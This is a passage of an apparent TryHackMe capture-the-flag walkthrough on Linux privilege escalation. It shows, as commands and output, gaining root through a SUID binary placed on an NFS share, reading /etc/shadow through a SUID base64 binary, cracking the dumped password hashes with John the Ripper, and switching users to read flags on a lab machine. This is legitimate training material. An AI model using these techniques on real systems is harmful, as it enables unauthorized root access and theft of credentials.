./exec_bash_patched: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./exec_bash_patched)
$ 
```

Still no joy! Let's do a third and final try.

On a separate Ubuntu 20.04.1 64-bit system we compile a new version of the `exec_bash` binary

```bash
ubuntu@ubuntu:/mnt/hgfs/Wargames/TryHackMe/Walkthroughs/Medium/Linux_Privilege_Escalation$ gcc exec_bash.c -o exec_bash
ubuntu@ubuntu:/mnt/hgfs/Wargames/TryHackMe/Walkthroughs/Medium/Linux_Privilege_Escalation$ ldd exec_bash
    linux-vdso.so.1 (0x00007ffc4a58b000)
    libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ff3e2d2c000)
    /lib64/ld-linux-x86-64.so.2 (0x00007ff3e2f34000)
ubuntu@ubuntu:/mnt/hgfs/Wargames/TryHackMe/Walkthroughs/Medium/Linux_Privilege_Escalation$ objdump -T exec_bash | grep LIBC
0000000000000000      DF *UND*  0000000000000000  GLIBC_2.2.5 system
0000000000000000      DF *UND*  0000000000000000  GLIBC_2.2.5 __libc_start_main
0000000000000000      DF *UND*  0000000000000000  GLIBC_2.2.5 setgid
0000000000000000      DF *UND*  0000000000000000  GLIBC_2.2.5 setuid
0000000000000000  w   DF *UND*  0000000000000000  GLIBC_2.2.5 __cxa_finalize
ubuntu@ubuntu:/mnt/hgfs/Wargames/TryHackMe/Walkthroughs/Medium/Linux_Privilege_Escalation$ 
```

Then we copy it to the NFS-share and set the SUID-bit

```bash
┌──(root㉿kali)-[/mnt/mount_pt]
└─# cp /mnt/hgfs/Wargames/TryHackMe/Walkthroughs/Medium/Linux_Privilege_Escalation/exec_bash .

┌──(root㉿kali)-[/mnt/mount_pt]
└─# chmod +s exec_bash  
```

Back at the machine we can now try to run it again

```bash
$ ./exec_bash
root@ip-10-64-188-150:/tmp# id
uid=0(root) gid=0(root) groups=0(root),1001(karen)
root@ip-10-64-188-150:/tmp# 
```

And we are, finally, root and can get the flag.

```bash
root@ip-10-64-188-150:/tmp# find / -name flag7.txt
/home/matt/flag7.txt
root@ip-10-64-188-150:/tmp# cat /home/matt/flag7.txt
THM-<REDACTED>
root@ip-10-64-188-150:/tmp# 
```

Answer: `THM-<REDACTED>`

### Task 12: Capstone Challenge

By now you have a fairly good understanding of the main privilege escalation vectors on Linux and this challenge should be fairly easy.

You have gained SSH access to a large scientific facility. Try to elevate your privileges until you are Root.

We designed this room to help you build a thorough methodology for Linux privilege escalation that will be very useful in exams such as OSCP and your penetration testing engagements.

Leave no privilege escalation vector unexplored, privilege escalation is often more an art than a science.

You can access the target machine over your browser or use the SSH credentials below.

- **Username**: leonard
- **Password**: Penny123

---------------------------------------------------------------------------------------

#### What is the content of the flag1.txt file?

We start by connecting with SSH to the machine

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_Privilege_Escalation]
└─$ ssh leonard@10.64.169.53
The authenticity of host '10.64.169.53 (10.64.169.53)' can't be established.
ED25519 key fingerprint is SHA256:1dMTd32PB7hStUUoiefpE+ckRSQl9B6tlu4mBNO2v4k.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.64.169.53' (ED25519) to the list of known hosts.
(leonard@10.64.169.53) Password: 
Last login: Thu Dec 18 17:19:54 2025 from ip-10-64-65-34.ec2.internal
[leonard@ip-10-64-169-53 ~]$ 
```

Next, we check for ways to escalate our privileges

```bash
[leonard@ip-10-64-169-53 ~]$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for leonard: 
Sorry, user leonard may not run sudo on ip-10-64-169-53.
[leonard@ip-10-64-169-53 ~]$ find / -type f -perm /4000 2>/dev/null
/usr/bin/base64
/usr/bin/ksu
/usr/bin/fusermount
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chage
/usr/bin/newgrp
/usr/bin/staprun
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/Xorg
/usr/bin/mount
/usr/bin/umount
/usr/bin/crontab
/usr/bin/pkexec
/usr/bin/at
/usr/bin/sudo
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/usernetctl
/usr/sbin/userhelper
/usr/sbin/mount.nfs
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/kde4/kpac_dhcp_helper
/usr/libexec/dbus-1/dbus-daemon-launch-helper
/usr/libexec/spice-gtk-x86_64/spice-client-glib-usb-acl-helper
/usr/libexec/qemu-bridge-helper
/usr/libexec/sssd/krb5_child
/usr/libexec/sssd/ldap_child
/usr/libexec/sssd/selinux_child
/usr/libexec/sssd/proxy_child
/usr/libexec/abrt-action-install-debuginfo-to-abrt-cache
/usr/libexec/flatpak-bwrap
[leonard@ip-10-64-169-53 ~]$ ls -l /usr/bin/base64 
-rwsr-xr-x. 1 root root 37360 Aug 20  2019 /usr/bin/base64
[leonard@ip-10-64-169-53 ~]$ 
```

As before, the `base64` binary has its SUID-bit set.

But we don't have a location for the flag. Let's search for it.

```bash
[leonard@ip-10-64-169-53 ~]$ find / -name flag1.txt -ls 2>/dev/null
[leonard@ip-10-64-169-53 ~]$ 
```

Nope, we can't see it (yet).

What other users are there?

```bash
[leonard@ip-10-64-169-53 ~]$ cat /etc/passwd | grep -v nologin
root:x:0:0:root:/root:/bin/bash
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
leonard:x:1000:1000:leonard:/home/leonard:/bin/bash
missy:x:1001:1001::/home/missy:/bin/bash
[leonard@ip-10-64-169-53 ~]$ 
```

There is also a `missy` user.

And there is a `rootflag` directory in the `home`:

```bash
[leonard@ip-10-64-169-53 ~]$ ls -l /home
total 4
drwx------.  7 leonard leonard  197 Jun  7  2021 leonard
drwx------. 16 missy   missy   4096 Jun  7  2021 missy
drwx------.  2 root    root      23 Jun  7  2021 rootflag
```

Let's check for flags in this directory:

```bash
[leonard@ip-10-64-169-53 ~]$ base64 /home/rootflag/flag1.txt
base64: /home/rootflag/flag1.txt: No such file or directory
[leonard@ip-10-64-169-53 ~]$ base64 /home/rootflag/flag2.txt
VEhNLTE2ODgyNDc4MjM5MDIzOAo=
[leonard@ip-10-64-169-53 ~]$ 
```

During some enumeration of local files a `.bash_history` file was found:

```bash
[leonard@ip-10-64-169-53 ~]$ ls -la
total 28
drwx------. 7 leonard leonard 197 Jun  7  2021 .
drwxr-xr-x. 5 root    root     50 Jun  7  2021 ..
-rw-------. 1 leonard leonard 142 Jun  7  2021 .bash_history
-rw-r--r--. 1 leonard leonard  18 Apr  1  2020 .bash_logout
-rw-r--r--. 1 leonard leonard 193 Apr  1  2020 .bash_profile
-rw-r--r--. 1 leonard leonard 231 Apr  1  2020 .bashrc
drwxrwxr-x. 3 leonard leonard  18 Jun  7  2021 .cache
drwxrwxr-x. 3 leonard leonard  18 Jun  7  2021 .config
-rw-r--r--. 1 leonard leonard 334 Nov 27  2019 .emacs
-rw-r--r--. 1 leonard leonard 172 Apr  1  2020 .kshrc
drwxrwxr-x. 3 leonard leonard  19 Jun  7  2021 .local
drwxr-xr-x. 4 leonard leonard  39 Jun  7  2021 .mozilla
drwxrwxr-x. 2 leonard leonard   6 Jun  7  2021 perl5
-rw-r--r--. 1 leonard leonard 658 Apr  7  2020 .zshrc
[leonard@ip-10-64-169-53 ~]$ cat .bash_history 
ls
cd ..
exit
ls
cd çç
cd ..
ls
cd home/
ls
cd missy/
su missy 
ls
cd ..
ls
cd rootflag/
ls
cat flag2.txt 
su root
ls
cd rootflag/
su missy
```

It looks like we need to become the `missy` user.

We can read the `/etc/shadow` file as before and try to crack the passwords in it.

```bash
[leonard@ip-10-64-169-53 ~]$ base64 /etc/shadow | base64 -d
root:$6$DWBzMoiprTTJ4gbW$g0szmtfn3HYFQweUPpSUCgHXZLzVii5o6PM0Q2oMmaDD9oGUSxe1yvKbnYsaSYHrUEQXTjIwOW/yrzV5HtIL51::0:99999:7:::
bin:*:18353:0:99999:7:::
daemon:*:18353:0:99999:7:::
adm:*:18353:0:99999:7:::
lp:*:18353:0:99999:7:::
sync:*:18353:0:99999:7:::
shutdown:*:18353:0:99999:7:::
halt:*:18353:0:99999:7:::
mail:*:18353:0:99999:7:::
operator:*:18353:0:99999:7:::
games:*:18353:0:99999:7:::
ftp:*:18353:0:99999:7:::
nobody:*:18353:0:99999:7:::
pegasus:!!:18785::::::
systemd-network:!!:18785::::::
dbus:!!:18785::::::
polkitd:!!:18785::::::
colord:!!:18785::::::
unbound:!!:18785::::::
libstoragemgmt:!!:18785::::::
saslauth:!!:18785::::::
rpc:!!:18785:0:99999:7:::
gluster:!!:18785::::::
abrt:!!:18785::::::
postfix:!!:18785::::::
setroubleshoot:!!:18785::::::
rtkit:!!:18785::::::
pulse:!!:18785::::::
radvd:!!:18785::::::
chrony:!!:18785::::::
saned:!!:18785::::::
apache:!!:18785::::::
qemu:!!:18785::::::
ntp:!!:18785::::::
tss:!!:18785::::::
sssd:!!:18785::::::
usbmuxd:!!:18785::::::
geoclue:!!:18785::::::
gdm:!!:18785::::::
rpcuser:!!:18785::::::
nfsnobody:!!:18785::::::
gnome-initial-setup:!!:18785::::::
pcp:!!:18785::::::
sshd:!!:18785::::::
avahi:!!:18785::::::
oprofile:!!:18785::::::
tcpdump:!!:18785::::::
leonard:$6$JELumeiiJFPMFj3X$OXKY.N8LDHHTtF5Q/pTCsWbZtO6SfAzEQ6UkeFJy.Kx5C9rXFuPr.8n3v7TbZEttkGKCVj50KavJNAm7ZjRi4/::0:99999:7:::
mailnull:!!:18785::::::
smmsp:!!:18785::::::
nscd:!!:18785::::::
missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:18785:0:99999:7:::
```

We create a local copy of the shadow file and try to crack it with John and the Rockyou wordlist as before.

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_Privilege_Escalation]
└─$ vi shadow_3.txt

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_Privilege_Escalation]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt shadow_3.txt 
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password1        (missy)    
1g 0:00:01:33 0.75% (ETA: 21:13:41) 0.01072g/s 1378p/s 2794c/s 2794C/s tweety55..smoke123
Use the "--show" option to display all of the cracked passwords reliably
Session aborted
```

Now we can become missy and search for the flag

```bash
[leonard@ip-10-64-169-53 ~]$ su missy
Password: 
[missy@ip-10-64-169-53 leonard]$ find / -name flag1.txt 2>/dev/null
/home/missy/Documents/flag1.txt
[missy@ip-10-64-169-53 leonard]$ 
```

Finally, we can `cat` the flag

```bash
[missy@ip-10-64-169-53 leonard]$ cat /home/missy/Documents/flag1.txt 
THM-<REDACTED>
[missy@ip-10-64-169-53 leonard]$ 
```

Answer: `THM-<REDACTED>`

#### What is the content of the flag2.txt file?

From above we know the location of the flag and the privilege escalation vector:

```bash
[leonard@ip-10-64-169-53 ~]$ base64 /home/rootflag/flag2.txt | base64 -d
THM-<REDACTED>
```

Answer: `THM-<REDACTED>`

For additional information, please see the references below.

## References

- [Exploit (computer security) - Wikipedia](https://en.wikipedia.org/wiki/Exploit_(computer_security))
- [find - Linux manual page](https://man7.org/linux/man-pages/man1/find.1.html)
- [GTFOBins - Homepage](https://gtfobins.github.io/)
- [history - Linux manual page](https://www.man7.org/linux/man-pages/man3/history.3.html)
- [id - Linux manual page](https://man7.org/linux/man-pages/man1/id.1.html)
- [John the Ripper - Homepage](https://www.openwall.com/john/)
- [john - Kali Tools](https://www.kali.org/tools/john/)
- [mount - Linux manual page](https://man7.org/linux/man-pages/man8/mount.8.html)
- [netstat - Linux manual page](https://man7.org/linux/man-pages/man8/netstat.8.html)
- [Network File System - Wikipedia](https://en.wikipedia.org/wiki/Network_File_System)
- [Privilege escalation - Wikipedia](https://en.wikipedia.org/wiki/Privilege_escalation)
- [ps - Linux manual page](https://man7.org/linux/man-pages/man1/ps.1.html)
- [Setuid - Wikipedia](https://en.wikipedia.org/wiki/Setuid)
- [showmount - Linux manual page](https://man7.org/linux/man-pages/man8/showmount.8.html)
- [sudo - Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [sudo - Wikipedia](https://en.wikipedia.org/wiki/Sudo)
- [umount - Linux manual page](https://man7.org/linux/man-pages/man8/umount.8.html)
- [uname - Linux manual page](https://man7.org/linux/man-pages/man1/uname.1.html)
